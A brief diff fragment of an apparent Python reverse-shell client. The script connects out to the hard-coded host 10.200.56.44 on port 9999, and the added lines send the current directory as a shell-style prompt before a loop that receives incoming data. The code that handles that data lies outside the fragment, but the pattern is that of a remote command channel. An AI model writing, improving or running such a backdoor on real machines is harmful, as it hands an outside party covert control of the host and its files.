@@ -7,6 +7,8 @@ host = "10.200.56.44"
 port = 9999
 
 s.connect((host, port))
+currentDir = os.getcwd() + " >"
+s.send(str.encode(currentDir))
 
 while True :
 	data = s.recv(1024)
